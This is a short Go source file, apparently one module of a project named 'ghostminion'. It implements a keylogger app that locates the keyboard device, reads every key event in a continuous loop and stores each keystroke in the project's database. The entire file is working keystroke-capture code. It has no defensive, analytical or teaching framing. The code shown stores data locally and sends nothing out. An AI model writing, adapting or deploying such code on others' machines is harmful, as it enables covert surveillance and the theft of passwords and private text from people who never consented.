package apps

import (
	"fmt"
	"ghostminion/db"
	"github.com/MarinX/keylogger"
	"sync"
)

type KeyLoggerApp struct{}

var stopKeyloggerApp = false

func (c *KeyLoggerApp) Start(wg *sync.WaitGroup) {
	defer wg.Done()
	keyboard := keylogger.FindKeyboardDevice()
	if len(keyboard) <= 0 {
		fmt.Println("No keyboard found...you will need to provide manual input path")
		return
	}
	fmt.Println("Found a keyboard at", keyboard)
	klgr, err := keylogger.New(keyboard)
	if err != nil {
		fmt.Printf("Error: %v", err)
		return
	}
	defer klgr.Close()
	for stopKeyloggerApp != true {
		events := klgr.Read()
		for e := range events {
			if e.Type == keylogger.EvKey {
				err = db.WriteDataRow("", db.KeylogsDataType, []byte(e.KeyString())) // replace reqId
				if err != nil {
					fmt.Printf("error: %v", err)
				}
			}
		}
	}
}

func (c *KeyLoggerApp) Stop() error {
	stopKeyloggerApp = true
	return nil
}

func (c *KeyLoggerApp) Validate() error {
	return nil
}
